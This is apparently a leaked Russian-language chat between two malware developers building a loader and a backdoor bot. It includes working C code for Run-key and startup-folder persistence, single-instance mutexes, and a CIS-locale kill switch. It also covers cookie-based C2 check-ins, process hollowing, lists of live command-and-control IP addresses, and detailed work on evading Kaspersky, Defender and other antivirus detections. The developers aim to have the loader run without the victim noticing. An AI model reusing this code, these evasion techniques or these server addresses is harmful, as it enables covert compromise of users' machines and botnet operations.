Когда exe-файл сохраняю в папку App Data Касперский реагирует. Как с этим быть?

2020-07-16T15:56:06 mushroom -> frog
Какой exe файл?

2020-07-16T15:56:20 mushroom -> frog
Для команды запуск файла?

2020-07-16T15:56:29 frog -> mushroom
загрузчика

2020-07-16T15:56:37 mushroom -> frog
При обновлении?

2020-07-16T15:57:17 frog -> mushroom
Да, если версии не совпадают, скачиваю и сохраняю туда файл загрузчика

2020-07-16T15:57:25 mushroom -> frog
Попробуй в Temp. Если не проходит просканируй его на dyncheck.

2020-07-16T15:57:43 mushroom -> frog
И так же найди место, которое палится и измени.

2020-07-16T15:57:50 mushroom -> frog
Как ты делал с ботом.

2020-07-17T12:38:51 frog -> mushroom
Привет.
Не успел устранить все реакции антивируса. Всё было сделал, но решил скомпилировать боевую версию и антивирус опять увидел угрозу.
В старом resolve_emercoin.h есть что-то опасное (для антивируса) и на get_possible_domain он тоже реагирует. Потому что, если его закомментировать, то всё нормально.
Нужно ещё время. К понедельнику постараюсь всё сделать.

2020-07-17T12:39:57 frog -> mushroom
Запуск по цепочке "Загрузчик -> Загрузчик -> Бот" работает нормально.

2020-07-17T12:41:45 frog -> mushroom
Как вызывать функцию для добавления в автозапуск addAutostart?
Добавление в реестр сделал, но хотелось бы и в автозапуск тоже попробовать добавиться.

2020-07-17T12:45:51 frog -> mushroom
Ещё обратил внимание, что обфускатор строк работает как-то странно.
Пример из модуля anchorange. Вот так работает не правильно:
status = ADVAPI32(RegCreateKeyExW)(currUserKey,  _TSTR(TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"))), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &runKey, &disposition);
А так правильно, если скопировать строку:
KERNEL32(lstrcpyW)(sub_key, _TSTR(TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run")));
status = ADVAPI32(RegCreateKeyExW)(currUserKey, sub_key, 0, NULL,
REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &runKey, &disposition);

2020-07-17T12:49:15 frog -> mushroom
И такое обстоятельство не могу понять. Запускаю один и то же бот на разных машинах (на Windows 7 и на Windows 10) - один виден в админке (первый), второй не виден, хотя команда NOP приходит на все машины.

2020-07-17T12:50:21 mushroom -> frog
Да. Со строками так. Если юникод надо сначала в буфер скопировать lstrcpyW(sub_key, _WCS(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"))

2020-07-17T12:50:38 mushroom -> frog
Если ANSI не надо копировать в промежуточный буфер.

2020-07-17T12:52:39 mushroom -> frog
_Success_(return != 0)
BOOL addAutostart(_In_z_ PCWSTR linkName, _In_z_ PCTSTR targetFileName,
    _In_opt_z_ PCTSTR description, _In_opt_z_ PCTSTR workingDir, _In_opt_z_ PCTSTR iconPath,
    _In_opt_ int iconIndex)

2020-07-17T12:52:48 mushroom -> frog
Эта фунция имеется ввиду?

2020-07-17T12:53:02 frog -> mushroom
Да

2020-07-17T12:53:13 mushroom -> frog
А что не понятно.

2020-07-17T12:54:56 mushroom -> frog
linjName имя ярлыка, targetFileName имя файла на котороый ярлык указывает, description описания для ярлыка, workingDir рабочая папка для ярлыка, iconPath имя файла иконки для ярлыка, iconIndex индекс картинки в файле ico.

2020-07-17T12:54:58 frog -> mushroom
Пробовал так, но не сработало:
addAutostart(L"link.exe", L"D:\\dl7.exe", L"My program", L"D:\\", 0, 0);
И последние 2 параметра не понятны

2020-07-17T12:55:11 mushroom -> frog
То что _opt_ можно NULL.

2020-07-17T12:55:41 mushroom -> frog
По факту нужно только два первых параметра.

2020-07-17T12:56:00 mushroom -> frog
Открой свойства любого ярлыка и посмотри.

2020-07-17T12:56:27 mushroom -> frog
У него все эти параметры будут.

2020-07-17T12:57:09 mushroom -> frog
Рабочая папка, значёк и т.д.

2020-07-17T12:58:26 mushroom -> frog
Смотри строки которые ты передавал первая юникод, все остальные могут быть как юникод, так и ANSI.

2020-07-17T12:58:49 mushroom -> frog
У тебя PCTSTR во что превращается?

2020-07-17T12:59:00 mushroom -> frog
В PCSTR или PCWSTR?

2020-07-17T12:59:26 frog -> mushroom
LPCWSTR

2020-07-17T13:00:20 mushroom -> frog
И какая ошибка?

2020-07-17T13:00:30 mushroom -> frog
GetLastError что даёт?

2020-07-17T13:00:49 mushroom -> frog
И где? В каком месте этой функции?

2020-07-17T13:01:44 mushroom -> frog
У тебя и в реестр добавится и в автозапуск. А работать только один будет, который первый запустился?

2020-07-17T13:04:36 frog -> mushroom
Разобрался. Нужно было указать расширение lnk. Вот так заработало:
addAutostart(L"link1.lnk", L"D:\\dl7.exe", 0, 0, 0, 0);
Хотел сделать так: добавиться в автозагрузку. Если не получилось добавиться в автозагрузку, то в реестр.

2020-07-17T13:05:23 mushroom -> frog
Можно так. Главное чтобы только один экземпляр всегда работал.

2020-07-17T13:06:51 frog -> mushroom
Подправил немного функцию addAutostart. Внутри неё нужно ещё вызвать  "OLE32(CoInitialize)(NULL)", иначе не работает.

2020-07-17T13:07:21 mushroom -> frog
Да нужно. Не обязательно в ней. Лучше глобально для всей программы.

2020-07-17T13:08:54 frog -> mushroom
А можно добавляться и в реестр и в автозапуск? Как тогда синхронизироваться?

2020-07-17T13:14:13 mushroom -> frog
Типа так:
#if defined(ONE_INSTANCE_FILE)
    TCHAR homePath[MAX_PATH + 1];
    kernel32.expandEnvironmentStrings(_TSTR(TEXT("%USERPROFILE%")), homePath, _countof(homePath));

    TCHAR oneInstanceFilename[MAX_PATH + 1];
    wsprintf(oneInstanceFilename, _TSTR(TEXT("%s\\%s")), homePath, _TSTR(GLOBAL_APP_CHILD_ID));
    HANDLE oneInstanceChildFile = kernel32.createFile(oneInstanceFilename, GENERIC_READ, 0, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (oneInstanceChildFile == INVALID_HANDLE_VALUE && kernel32.getLastError() == ERROR_FILE_NOT_FOUND)
    {
        debug_printf(TEXT("Child program is already running. Quit\n"));
        waitForMessageBox();
        return 1;
    }

    wsprintf(oneInstanceFilename, _TSTR(TEXT("%s\\%s")), homePath, _TSTR(GLOBAL_APP_ID));
    g_oneInstanceFile = kernel32.createFile(oneInstanceFilename, GENERIC_READ, 0, NULL,
        CREATE_NEW, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
        NULL);
    if (g_oneInstanceFile == INVALID_HANDLE_VALUE && kernel32.getLastError() == ERROR_FILE_EXISTS)
    {
        debug_printf(TEXT("There is another instance of this program running already. Quit\n"));
        waitForMessageBox();
        return 1;
    }
#elif defined(ONE_INSTANCE_MUTEX)
    HANDLE oneInstanceChildMutex = kernel32.createMutex(NULL, FALSE, _TSTR(GLOBAL_APP_CHILD_ID));
    if (oneInstanceChildMutex)
    {
        if (kernel32.getLastError() == ERROR_ALREADY_EXISTS)
        {
            debug_printf(TEXT("Child program is already running. Quit\n"));
            kernel32.closeHandle(oneInstanceChildMutex);
            waitForMessageBox();
            return 1;
        }

        kernel32.closeHandle(oneInstanceChildMutex);
    }

    g_oneInstanceMutex = kernel32.createMutex(NULL, FALSE, _TSTR(GLOBAL_APP_ID));
    if (g_oneInstanceMutex && kernel32.getLastError() == ERROR_ALREADY_EXISTS)
    {
        debug_printf(TEXT("There is another instance of this program running already. Quit\n"));
        kernel32.closeHandle(g_oneInstanceMutex);
        waitForMessageBox();
        return 1;
    }
#elif defined(ONE_INSTANCE_GLOBAL_ATOM)
    ATOM childAtom = kernel32.globalFindAtom(_TSTR(GLOBAL_APP_CHILD_ID));
    if (childAtom)
    {
        debug_printf(TEXT("Child program is already running. Quit\n"));
#ifdef _DEBUG
        kernel32.globalDeleteAtom(childAtom);
#endif // _DEBUG
        waitForMessageBox();
        return 1;
    }

    g_oneInstanceAtom = kernel32.globalFindAtom(_TSTR(GLOBAL_APP_ID));
    if (g_oneInstanceAtom)
    {
        debug_printf(TEXT("There is another instance of this program running already. Quit\n"));
#ifdef _DEBUG
        kernel32.globalDeleteAtom(g_oneInstanceAtom);
#endif // _DEBUG
        waitForMessageBox();
        return 1;
    }
    else
        g_oneInstanceAtom = kernel32.globalAddAtom(_TSTR(GLOBAL_APP_ID));
#endif

2020-07-17T13:14:48 mushroom -> frog
Первый способ создать файл и открыть его. Другая программа получит ошибку открытия файла, значит одна версия работает уже.

2020-07-17T13:15:23 mushroom -> frog
Второй способ создать мьютекс, вторая программа попытается создать мьютекс и получит ошибку что он уже есть.

2020-07-17T13:16:12 mushroom -> frog
Третий способ добавить переменную в глобальную таблицу globalatom, вторая попробует прочитает что в этой таблице она уже есть.

2020-07-17T13:18:14 mushroom -> frog
Лог пишется у тебя в файл в сборках Release?

2020-07-17T13:18:24 frog -> mushroom
Да

2020-07-17T13:18:29 mushroom -> frog
Всё проверил как я вчера говорил?

2020-07-17T13:18:46 mushroom -> frog
Всё гладко работает?

2020-07-17T13:20:46 frog -> mushroom
Выше написал, что ещё нужно найти на что реагирует антивирус в resolve_emercoin.h.
В старом resolve_emercoin.h есть что-то опасное (для антивируса) и на get_possible_domain он тоже реагирует. Потому что, если его закомментировать, то всё нормально.

2020-07-17T13:21:17 frog -> mushroom
И такое обстоятельство не могу понять. Запускаю один и то же бот на разных машинах (на Windows 7 и на Windows 10) - один виден в админке (первый), второй не виден, хотя команда NOP приходит на все машины.

2020-07-17T13:21:58 mushroom -> frog
Это скорей вскго потому что группа не определилась на сервере.

2020-07-17T13:22:12 mushroom -> frog
На Win 10 Server не видит?

2020-07-17T13:23:01 frog -> mushroom
Обычная Windows 10.

2020-07-17T13:23:27 mushroom -> frog
А как ты куки передаёшь?

2020-07-17T13:24:18 frog -> mushroom
m_lstrcpy(szHeaders, _STR("Cookie: group="  GROUP ";"));
(!GET_API(HttpSendRequestA)(hHttpRequest, szHeaders, strlen(szHeaders), nullptr, 0))

2020-07-17T13:24:57 frog -> mushroom
#define GROUP "frog"

2020-07-17T13:25:37 mushroom -> frog
INTERNET_FLAG_NO_COOKIES используешь в httpOpenRequest?

2020-07-17T13:25:52 mushroom -> frog
Если не используешь WinInet твои куки сотрёт.

2020-07-17T13:26:17 frog -> mushroom
Да
HINTERNET hHttpRequest = GET_API(HttpOpenRequestA)(
        hHttpSession, _STR("GET"), objectName,
        _STR("HTTP/1.1"), nullptr, nullptr, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_COOKIES, (DWORD_PTR)0);

2020-07-17T13:27:03 mushroom -> frog
А INTERNET_FLAG_SECURE?

2020-07-17T13:27:11 mushroom -> frog
Надо https

2020-07-17T13:27:18 mushroom -> frog
Для боевого сервера.

2020-07-17T13:28:20 mushroom -> frog
Можешь попробовать сменить id бота. Просто ты мог его запустить раньше с другой группой, и она запомнилась на сервере.

2020-07-17T13:28:32 mushroom -> frog
И тебе по этому не виден бот.

2020-07-17T13:28:51 mushroom -> frog
Сменить id просто. Измени немного дату создания папки Windows.

2020-07-17T13:29:09 frog -> mushroom
Ясно, спасибо

2020-07-17T13:29:48 mushroom -> frog
Что осталось доделать получается?

2020-07-17T13:31:14 frog -> mushroom
В общем-то разобраться с resolve_emercoin.h, обфусцировать get_possible_domain.
Синхронизацию тогда ещё добавлю.

2020-07-17T13:32:01 mushroom -> frog
Давай. В приоритете убрать эти детекты.

2020-07-17T13:32:18 mushroom -> frog
Чтобы иожно было отдать тестеру для окончательной проверки.

2020-07-17T13:33:28 frog -> mushroom
А почему может быть так: один и тот же код в оконной версии детектируется, а в консольной нет?

2020-07-17T13:33:51 frog -> mushroom
При прочих равных условиях

2020-07-17T13:34:41 mushroom -> frog
Значит не все равные условия, или антивирус видит что ты хитришь, оконное приложение, а окно не показываешь.

2020-07-17T13:37:59 mushroom -> frog
Но я думаю что не все равные условия.

2020-07-20T07:57:15 frog -> mushroom
Привет!
Загрузил проекты на gitlab.

2020-07-20T08:12:19 frog -> mushroom
Проверил все программы на 2 системах: Windows 7 x64 и Windows 10 x64. Подключался к тестовому серверу. На боевом проверить не успел, но, наверное всё должно работать, только ip-адреса нужно указать в config.h.
В config.h добавил макрос-идентификатор TEST_BUILD. Если он включен, то компилируется тестовая версия, иначе боевая.
Под какими именами закрепляться в системе не придумал, но сделал так, чтобы эти имена можно передавать в командной строке, например:
dl7.exe "Имя_в_реестре" "Имя_в_автозагрузке"
Хотел ещё разобраться с иконками, но не успел.

2020-07-20T08:13:28 mushroom -> frog
Привет. А если не указать имена, закрепится?

2020-07-20T08:13:47 frog -> mushroom
Да, там есть имена по умолчанию

2020-07-20T08:14:15 mushroom -> frog
Проверяй на боевом сервере.
лоадеры
185.99.2.49       
78.108.216.13
217.12.209.44
91.235.129.151 
80.82.68.132
62.108.35.215


бот
85.204.116.188             
80.82.68.32
194.87.145.86
185.14.31.135 
45.148.120.142
62.109.13.184

2020-07-20T08:14:36 mushroom -> frog
Если всё гладко, скажу кому отдать на тесты.

2020-07-20T08:14:49 mushroom -> frog
Поверяй с логами и без логов.

2020-07-20T08:15:12 frog -> mushroom
Хорошо. Т.е. загрузить на боевой сервер 2 комплекта?

2020-07-20T08:16:50 mushroom -> frog
Можешь сразу загрузить туда версию без логов. Чтобы запустил загрузчик и пользователь ничего не заметил. Если найдутся косяки какие, загрузишь с логами и посмотришь в чём дело.

2020-07-20T10:03:57 mushroom -> frog
Как можно сменить id бота твоего?

2020-07-20T10:05:52 frog -> mushroom
В systeminfo.cpp в 56 строчке можно прибавить любое число к секунде или минуте

2020-07-20T10:09:47 mushroom -> frog
В сборке Release подключается к тестовому серверу.

2020-07-20T10:09:57 mushroom -> frog
Надо к боевому.

2020-07-20T10:11:45 frog -> mushroom
Хорошо. В config.h строку с TEST_BUILD можно закомментировать, тогда к боевому подключится.

2020-07-20T10:12:19 mushroom -> frog
Надо чтобы так было всегда, тестер будет проверять на боевом сервере. Закоммить это.

2020-07-20T10:17:26 mushroom -> frog
Версию бота и загрузчика надо прошить так же как и группу в программах.

2020-07-20T10:20:04 mushroom -> frog
Ещё. При подключении к серверу, после его проверки. Надо посылать сообщение в котором указана версия программы и используемый в данный момент адрес. POST /<id>/4 с телом сообщения. Типа Version 0.1 Address 255.255.255.255.

2020-07-20T10:20:52 mushroom -> frog
Если произошло переподключение, так же сообщение в котором указывается используемый адрес.

2020-07-20T10:22:02 mushroom -> frog
Каждый час работы, надо посылать сообщение в котором указывается время работы бота. Типа Uptime 3600000 мсек.

2020-07-20T10:22:54 mushroom -> frog
cname ???

2020-07-20T10:23:12 mushroom -> frog
При получении информации о системе.

2020-07-20T10:24:22 mushroom -> frog
ip три адреса. Первый это внешний, а второй и третий что означают?

2020-07-20T10:25:33 frog -> mushroom
Которые возвращает pgethostbyname.

2020-07-20T10:26:10 mushroom -> frog
Это локальные адреса типа?

2020-07-20T10:26:27 frog -> mushroom
Да

2020-07-20T10:26:54 mushroom -> frog
Они в принципе не нужны. Оставь так пока.

2020-07-20T10:26:57 mushroom -> frog
cname ???

2020-07-20T10:27:08 mushroom -> frog
Имя компьютера не определилось.

2020-07-20T10:28:02 mushroom -> frog
Или передалось с ошибкой. В общем вместо него ???

2020-07-20T10:28:33 frog -> mushroom
Посмотрю, может что-то с кодировкой произошло

2020-07-20T10:28:54 mushroom -> frog
Hollowing 32 -> 64 работает?

2020-07-20T10:29:19 frog -> mushroom
Нет.

2020-07-20T10:29:46 mushroom -> frog
Оставляй так пока.

2020-07-20T10:30:06 frog -> mushroom
Сомневаюсь, что это возможно вообще

2020-07-20T10:30:06 frog -> mushroom
Сомневаюсь, что это возможно вообще

2020-07-20T10:30:29 mushroom -> frog
Возможно. Я тебе давал пример processhelper.

2020-07-20T10:31:05 mushroom -> frog
Потом будет как доработка. Сейчас главное допилить ошибки.

2020-07-20T10:31:18 frog -> mushroom
Из 64-разрядной запустить 32-разрядную можно

2020-07-20T10:31:41 mushroom -> frog
Я это имел ввиду.

2020-07-20T10:32:04 frog -> mushroom
Это сделано

2020-07-20T10:32:52 mushroom -> frog
Антивирус только никогда не определяется Windows Defender у меня.

2020-07-20T10:33:33 mushroom -> frog
Standart Output
Standart Error
ОШИБКА.
Описание: Неправильное пространство имен

2020-07-20T10:33:46 mushroom -> frog
Это написано там где антивирус.

2020-07-20T10:34:02 frog -> mushroom
Антивирус узнаю так:
wmic /namespace:\\root\SecurityCenter path AntivirusProduct get displayName, versionNumber /format:list

2020-07-20T10:34:50 mushroom -> frog
Ты когда тестировал на Win 10 антивирус определялся?

2020-07-20T10:35:52 frog -> mushroom
Не проверил эту команду. Сейчас посмотрю

2020-07-20T10:36:15 mushroom -> frog
95 процентов где будет работать твоя программа это Win 10 64bit.

2020-07-20T10:41:15 frog -> mushroom
Тоже не работает

2020-07-20T10:41:26 mushroom -> frog
Реши вопрос.

2020-07-20T10:42:14 mushroom -> frog
По поводу 3 адресов, всё таки надо убрать и оставить 1. А то сервер, когда 3 адреса значёк страны не отображает в админке.

2020-07-20T10:42:26 mushroom -> frog
Оставить надо только внешний.

2020-07-20T10:43:22 mushroom -> frog
Я тебе давал пример как антивирус системы получить?

2020-07-20T10:43:36 mushroom -> frog
Вроде в самом начале давал.

2020-07-20T10:47:23 frog -> mushroom
Да, есть функция "ANTIVIRUSINFOLIST antivirusInfo()"

2020-07-20T10:47:40 frog -> mushroom
В info.cpp

2020-07-20T11:05:20 mushroom -> frog
Запуск powershell\cmd проверь такой сценарий cd c:\\r\ndir\r\n, у меня в результате получилось не содержимое дика C:\, а содержимое папки с программой.

2020-07-20T11:05:41 mushroom -> frog
Это запуск из памяти не сохраняя на диск сценарий.

2020-07-20T11:06:25 mushroom -> frog
Ты сценарий из памяти как запускаешь через пайп?

2020-07-20T11:10:26 frog -> mushroom
Конечно

2020-07-20T11:10:43 mushroom -> frog
cd c:\\r\ndir\r\n попробуй такой.

2020-07-20T11:11:59 mushroom -> frog
Получается что две команды отдельно выполняются, а не друг за одной.

2020-07-20T11:12:34 mushroom -> frog
Сейчас на своём боте проверю.

2020-07-20T11:15:51 mushroom -> frog
У меня диск C:\ содержимое вывелось.

2020-07-20T11:15:59 mushroom -> frog
Смотри где у тебя ошибка.

2020-07-20T11:16:34 mushroom -> frog
У тебя такое же даже, когда делаешь запуск сценария с сохранением на диск.

2020-07-20T11:17:36 frog -> mushroom
Команда такая должна быть: "c:\r\ndir\r\n".

2020-07-20T11:18:05 mushroom -> frog
А такая что не может быть cd c:\\r\ndir\r\n

2020-07-20T11:18:20 mushroom -> frog
А если мне надо паку сменить.

2020-07-20T11:18:26 mushroom -> frog
Папку.

2020-07-20T11:19:33 frog -> mushroom
cd на другой локальный диск не переключает

2020-07-20T11:20:01 mushroom -> frog
Сейчас проверю с диском D:\ у себя.

2020-07-20T11:21:12 mushroom -> frog
Работает.

2020-07-20T11:21:24 mushroom -> frog
У тебя ошибка где то.

2020-07-20T11:23:58 mushroom -> frog
В PowerShell переключает на другой диск, в cmd нет.

2020-07-20T11:24:11 mushroom -> frog
У тебя и в PowerShell не работает.

2020-07-20T11:25:20 mushroom -> frog
И если не переключать на другой диск тоже не идут команды по цепочке, как должно быть.

2020-07-20T11:25:34 mushroom -> frog
Посмотри в чём загвоздка.

2020-07-20T11:30:09 mushroom -> frog
Когда команда terminate process не удалась код ошибки шлёшь в ответе?

2020-07-20T11:31:46 mushroom -> frog
Когда успешно смотрю шлёшь Process_successful_terminate:. Ещё туда приписывай то что GetLastError даст, даже если успешно всё прошло. Будет тогда 0. Или просто шли только цифру котоую GetLastError даёт, можно ничего больше не писать.

2020-07-20T11:34:42 mushroom -> frog
Всё остальное нормально. Посмотрел.

2020-07-21T08:45:56 frog -> mushroom
Привет. Загрузил на gitlab проект бэкдора. Вчерашние замечания исправил. С антивирусником повозиться пришлось. 
Загрузчик немного подправлю и чуть позже загружу

2020-07-21T08:56:48 mushroom -> frog
Привет. Хорошо.

2020-07-21T10:38:30 frog -> mushroom
Когда загрузчик начал подключать к боевому серверу, антивирус Касперского стал показывать "Trojan-Downloader.Win32.Upatre".
С тестовым такого не было. В общем, разбираюсь

2020-07-21T10:39:21 mushroom -> frog
OK. Может адрес в чёрном списке у него.

2020-07-21T13:35:50 frog -> mushroom
Длинный список IP-адресов в модуле resolve_emercoin актуальный?

2020-07-21T13:36:34 mushroom -> frog
Может уже нет.

2020-07-21T13:39:04 frog -> mushroom
Оставить так пока этот список? Или их как-то проверить можно?
В ТЗ написано "немедленный отказ при работе в зоне .ru/СНГ - порезать на бекенде; также проверять наличие русской раскладки."
Это как реализовать?

2020-07-21T13:39:52 mushroom -> frog
Проверить раскладки клавиатуры и язык системы.

2020-07-21T13:41:13 mushroom -> frog
BOOL isLangForbidden(LANGID lang)
{
    UCHAR primaryLang = lang & 0xff;
    //UCHAR subLanguage = (lang >> 2) & 0xff;

    switch (primaryLang)
    {
    case LANG_RUSSIAN:
    case LANG_AZERBAIJANI:
    case LANG_ARMENIAN:
    case LANG_BELARUSIAN:
    case LANG_KAZAK:
    case LANG_KYRGYZ:
    case LANG_ROMANIAN:
    case LANG_TAJIK:
    case LANG_UZBEK:
    case LANG_GEORGIAN:
    case LANG_UKRAINIAN:
    case LANG_TURKMEN:
        return TRUE;
    }

    return FALSE;
}

BOOL forbiddenLocale()
{
    BOOL result = FALSE;

    LANGID sysDefaultLang = kernel32.getSystemDefaultLangID();
    result = isLangForbidden(sysDefaultLang);
    if (!result)
    {
        int hklCount = user32.getKeyboardLayoutList(0, NULL);
        HKL* hklList = (HKL*)HeapAlloc(GetProcessHeap(), 0, hklCount * sizeof(HKL));
        if (hklList)
        {
            user32.getKeyboardLayoutList(hklCount, hklList);
            for (int i = 0; i < hklCount && !result; ++i)
                result = isLangForbidden(*((WORD*)(&hklList[i])) & 0xffff);

            HeapFree(GetProcessHeap(), 0, hklList);
        }
    }

    return result;
}

2020-07-21T14:30:08 frog -> mushroom
В модуле info.h есть вызовы из Api-ms-win-core-version-l1-1-0.dll. Их тоже обфусцировать?

2020-07-21T14:30:38 mushroom -> frog
Нет.

2020-07-21T14:30:42 frog -> mushroom
Это для получения версии exe-файла антивируса

2020-07-21T14:31:01 mushroom -> frog
Или можешь придумать свой вариант.

2020-07-21T15:09:16 frog -> mushroom
"is suspected of Trojan.Downloader.gen.s" - это что может быть?

2020-07-21T15:09:50 mushroom -> frog
Это для загрузчика?

2020-07-21T15:13:16 mushroom -> frog
Функции или их последовательность в программе, которые скачивают и сохраняют файл скорей всего.

2020-07-21T15:13:23 frog -> mushroom
У бота иногда появляется (это статическая проверка на dyncheck.com, антивирус VBA32). Причём как-то странно: иногда показывает, иногда нет. Закомментирую какую-нибудь строчку случайную, которая вообще не относится ни к чему, или напишу лишнюю - пропадёт детект. Потом опять появится.

2020-07-21T15:14:13 mushroom -> frog
Последовательность функций какая то характерная для этого антивируса наверное.

2020-07-21T15:14:19 mushroom -> frog
Это для x64?

2020-07-21T15:14:40 frog -> mushroom
Нет, для x86

2020-07-21T15:15:31 mushroom -> frog
Для x64 нету такого?

2020-07-21T15:15:47 frog -> mushroom
Нет

2020-07-21T15:15:59 mushroom -> frog
Если нет пока оставляй, x64 используют.

2020-07-21T15:25:27 frog -> mushroom
Не успел доделать загрузчик. Долго ловил один детект. Антивирусу Касперского не нравился вызов CoCreateInstance для создания ярлыка в автозагрузке. Пришлось разбираться, чем заменить вызов этой функции. 
Имена ссылок в реестре и в автозагрузке, наверное, пропишу в config.h

2020-07-21T15:30:13 mushroom -> frog
Антивирусам не нравиться когда программы лезут в автозагрузку.

2020-07-21T15:36:41 frog -> mushroom
Текущую версию загрузчика загрузил на gitlab. Позже ещё добавлю проверку языка и проверю работу загрузчика на Windows 10

2020-07-21T15:37:50 mushroom -> frog
Хорошо.

2020-07-22T11:02:32 mushroom -> frog
Привет. Информация о системе, моя система определилась как Win 8, а у меня Win 10.

2020-07-23T05:57:56 mushroom -> frog
Привет. Информация о системе, моя система определилась как Win 8, а у меня Win 10.

2020-07-23T08:39:02 mushroom -> frog
Привет. Вчера смотрел всё вроде работает. Ты всё доделал?

2020-07-23T08:51:37 frog -> mushroom
Привет. Загрузил оба проекта на gitlab. Подправил определение версии ОС. Добавил определение локализации. Устранил некоторые ошибки и детекты.

2020-07-23T08:53:23 mushroom -> frog
Готовь версии с логами и без логов. И отдавай на тестирование bentley.

2020-07-23T08:53:32 mushroom -> frog
Добавь его себе.

2020-07-23T08:53:41 frog -> mushroom
Он есть у меня

2020-07-23T08:53:54 mushroom -> frog
Он протестирует на разных машинах ис разными антивирусами.

2020-07-23T08:54:02 mushroom -> frog
Тгда отдавай ему.

2020-07-23T08:54:44 mushroom -> frog
С этого момента каждая новая сборка увеличиваешь версию, которая прошита в боте и загрузчике.

2020-07-23T11:16:22 mushroom -> frog
Отдал bentley?

2020-07-23T11:16:45 mushroom -> frog
Когда отдашь скажешь.

2020-07-23T11:24:13 frog -> mushroom
Отдал

2020-07-23T11:25:47 mushroom -> frog
OK. Он тебе скажет какие детекты были (если были), исправишь. Ну и ошибки если всплывут. Нам надо чтобы не было ни одного детекта у антивирусов которыми он будет проверять твой комплект.

2020-07-28T10:50:35 mushroom -> frog
Привет. Что там с тестированием?

2020-07-28T10:51:48 frog -> mushroom
Привет. Жду результатов. Bentley пока не ответил.

2020-07-28T10:54:15 mushroom -> frog
На dyncheck динамику проверял?

2020-07-28T10:55:27 frog -> mushroom
Не проверял. Только статическую проверку делал.

2020-07-28T10:55:37 mushroom -> frog
Там надо только лоадер проверить.

2020-07-28T10:56:00 mushroom -> frog
Посмотри, потом скажи что как.

2020-07-28T10:56:50 frog -> mushroom
У меня там кол-во попыток проверки истекло(
Не знал, что там ограничение есть

2020-07-28T10:57:34 mushroom -> frog
Как это? У нас же одна учётная запись, я проверяю.

2020-07-28T10:57:48 mushroom -> frog
А через прокси если зайти.

2020-07-28T11:20:22 frog -> mushroom
Проверил 32-разрядную версию. 6 антивирусников негативно отреагировали. Некоторые говорят Gen:Variant.Fugrafa.68463

2020-07-28T11:21:48 mushroom -> frog
Подробности смотри, что пишут. Там половина из них наверное негативно реагируют на то что программа в интернет лезет это не считается.

2020-07-28T11:24:24 frog -> mushroom
https://dyncheck.com/scan/id/820a6c6c61889af6e2683da13f0e065d

2020-07-28T11:28:38 mushroom -> frog
Нормально в принципе. Ждём тогда когда, админку починят чтобы там уже окончательно протестировать с антивирусами, которые нас интересуют.

2020-07-28T11:28:56 mushroom -> frog
Можешь пока посмотреть что значит fugrafa.

2020-07-28T11:30:16 frog -> mushroom
Хорошо. Он уже был у меня. Пытался его поймать. Заметил только, что он появляется, когда тело функции main пустое или там несущественные инструкции.

2020-07-29T08:22:55 mushroom -> frog
Привет что по тестированию?

2020-07-29T08:23:45 frog -> mushroom
Привет. Пока ничего не сообщали

2020-07-29T08:29:02 mushroom -> frog
Какие там адреса сейчас в бэкдор и в загрузчике?

2020-07-29T08:35:32 frog -> mushroom
Бэкдор
85.204.116.188
80.82.68.32
194.87.145.86
185.14.31.135
45.148.120.142
62.109.13.184

2020-07-29T08:36:14 frog -> mushroom
Загрузчик
185.99.2.49
217.12.209.44
91.235.129.151
80.82.68.132
62.108.35.215
78.108.216.13

2020-07-29T08:39:08 mushroom -> frog
OK. В основном все живые адреса.

2020-07-29T14:16:46 mushroom -> frog
У меня Windows Defender сразу сожрал твой dl7.exe

2020-07-29T14:16:56 mushroom -> frog
x86

2020-07-29T14:17:14 mushroom -> frog
#unWhM}yn|~h6d3N

2020-07-29T14:17:22 mushroom -> frog
VirTool:Win32/Obfuscator.QV

2020-07-29T14:17:38 mushroom -> frog
Версия без логов.

2020-07-29T14:18:31 frog -> mushroom
Хорошо. Посмотрю.

2020-07-29T14:20:51 mushroom -> frog
inet_ntop
inet_pton

2020-07-29T14:21:00 mushroom -> frog
Убери из импорта.

2020-07-29T14:21:08 mushroom -> frog
Это для dl7

2020-07-29T14:23:25 frog -> mushroom
Да вроде давно уже убрал. Может старую какую-то версию смотришь?

2020-07-29T14:24:13 mushroom -> frog
Да. Сорян старую смотрел.

2020-07-29T14:25:26 mushroom -> frog
Ole32 убери из импорта.

2020-07-29T14:25:49 mushroom -> frog
CoGetClassObject

2020-07-29T14:26:05 mushroom -> frog
Она там одна у тебя в импорте dl7

2020-07-29T14:31:18 mushroom -> frog
Всё остальное норм обфусцированно.

2020-07-29T14:58:50 frog -> mushroom
Вот что за сегодня получилось:
32-разрядная версия загрузчика:
https://dyncheck.com/scan/id/15a2bc6c34388e5318dde882b4220567
64-разрядная версия загрузчика:
https://dyncheck.com/scan/id/1aed5c6380af122bbbf8d0b89939d96f

2020-07-29T15:00:38 mushroom -> frog
Хорошо получилось. Странно что у 32 нету детектов файервола. Он работает, скачивает и запускает бот?

2020-07-29T15:01:21 mushroom -> frog
А у 64 они есть.

2020-07-29T15:03:47 frog -> mushroom
На своей машине скачивает, запускает. А на dyncheck не знаю, нелогированные же версии проверяю, консоли не вижу.

2020-07-29T15:04:21 mushroom -> frog
Хорошо. Импорт убрал ole32?

2020-07-29T15:04:41 frog -> mushroom
Убрал

2020-07-29T15:05:34 mushroom -> frog
Обнови адреса.

2020-07-29T15:05:36 mushroom -> frog
лоадеры
31.214.240.203 
78.108.216.13
195.123.240.6
194.5.249.163
80.82.68.132
62.108.35.215


бот
85.204.116.188             
80.82.68.32
194.5.249.164
185.14.31.135 
45.148.120.142
62.109.13.184

2020-07-29T15:06:12 mushroom -> frog
И собери и Бентли отдай (с логами\без логов) весь комплект.

2020-07-29T15:08:51 frog -> mushroom
Хорошо. Он же наверное тот комплект проверяет? Сегодня он спрашивал у меня генератор идентификатора.

2020-07-29T15:09:24 mushroom -> frog
Собирался. Пока он мой проверяет. Ещё успеешь отдать новый.

2020-07-30T13:22:38 mushroom -> frog
